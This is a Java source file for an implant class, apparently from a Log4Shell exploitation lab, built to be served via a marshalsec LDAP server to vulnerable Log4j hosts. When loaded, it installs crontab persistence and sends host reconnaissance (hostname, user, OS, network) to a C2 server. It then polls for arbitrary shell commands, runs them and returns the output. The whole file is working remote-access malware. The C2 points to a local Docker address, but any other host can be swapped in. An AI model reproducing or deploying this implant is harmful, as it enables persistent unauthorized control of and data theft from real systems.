import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.stream.Collectors;

/**
 * Implant.java
 *
 * Served by marshalsec LDAP server. When a vulnerable Log4j instance
 * resolves a JNDI lookup, this class is fetched and executed.
 *
 * Behavior:
 *   1. Checks in with the C2 server          POST /checkin  {"host":"<hostname>"}
 *   2. Polls the C2 server for a command      GET  /command  -> {"command":"<cmd>"}
 *   3. Executes the command on the target
 *   4. Sends the output back to the C2        POST /result   {"output":"<output>"}
 *   5. Repeats steps 2-4 until told to stop
 *
 * The C2 server is a Flask app (c2-server/app/app.py) running at
 * http://127.0.0.1:5000 inside Docker.
 *
 * Compile:  /usr/lib/jvm/java-17-openjdk-amd64/bin/javac Implant.java
 */
public class Implant {

    // C2 Server
    static final String C2 = "http://127.0.0.1:5000";
    static final int POLL_SECONDS = 5;

    // Persistence via cronjob
    static void cronJob() {
        run("(crontab -l 2>/dev/null; echo \"@reboot java -cp /tmp Implant\") | crontab -");
    }

    /** Run a shell command, return stdout. */
    static String run(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String out = r.lines().collect(Collectors.joining("\n"));
            p.waitFor();
            return out;
        } catch (Exception e) {
            return "error: " + e.getMessage();
        }
    }

    /** HTTP POST with JSON body. */
    static String post(String path, String json) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(C2 + path).openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true);
            c.setRequestProperty("Content-Type", "application/json");
            c.setConnectTimeout(5000);
            c.setReadTimeout(5000);
            try (OutputStream o = c.getOutputStream()) { o.write(json.getBytes()); }
            BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
            return r.lines().collect(Collectors.joining());
        } catch (Exception e) { return null; }
    }

    /** HTTP GET, return response body. */
    static String get(String path) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(C2 + path).openConnection();
            c.setConnectTimeout(5000);
            c.setReadTimeout(5000);
            BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
            return r.lines().collect(Collectors.joining());
        } catch (Exception e) { return null; }
    }

    /** Pull value from {"key":"value"} without external libs. */
    static String json(String body, String key) {
        if (body == null) return null;
        int i = body.indexOf("\"" + key + "\"");
        if (i < 0) return null;
        int s = body.indexOf("\"", body.indexOf(":", i) + 1) + 1;
        int e = body.indexOf("\"", s);
        return (s > 0 && e > s) ? body.substring(s, e) : null;
    }

    /** Escape string for JSON value. */
    static String esc(String s) {
        return s == null ? "" : s
            .replace("\\", "\\\\").replace("\"", "\\\"")
            .replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
    }

    static {
        //Step 0: Install persistence
        cronJob();

        //Step 1: Check in with C2
        String host = run("hostname").trim();
        post("/checkin", "{\"host\":\"" + esc(host) + "\"}");

        //Step 2: Send initial recon as first result
        String recon = run(String.join(" && ",
            "echo '=== HOSTNAME ==='",       "hostname",
            "echo '=== WHOAMI ==='",         "whoami",
            "echo '=== ID ==='",             "id",
            "echo '=== OS ==='",             "uname -a",
            "echo '=== NETWORK ==='",        "ip addr 2>/dev/null || ifconfig 2>/dev/null"
        ));
        post("/result", "{\"output\":\"" + esc(recon) + "\"}");

        //Step 3: Poll for commands in a background thread
        Thread t = new Thread(() -> {
            int fails = 0;
            while (fails < 50) {
                try {
                    Thread.sleep(POLL_SECONDS * 1000);

                    String resp = get("/command");
                    if (resp == null) { fails++; continue; }
                    fails = 0;

                    String cmd = json(resp, "command");
                    if (cmd == null || cmd.equals("wait") || cmd.equals("none") || cmd.isEmpty())
                        continue;
                    if (cmd.equals("exit") || cmd.equals("quit")) return;

                    String out = run(cmd);
                    post("/result", "{\"output\":\"" + esc(out) + "\"}");

                } catch (Exception e) { fails++; }
            }
        });
        t.setDaemon(true);
        t.start();
    }
}
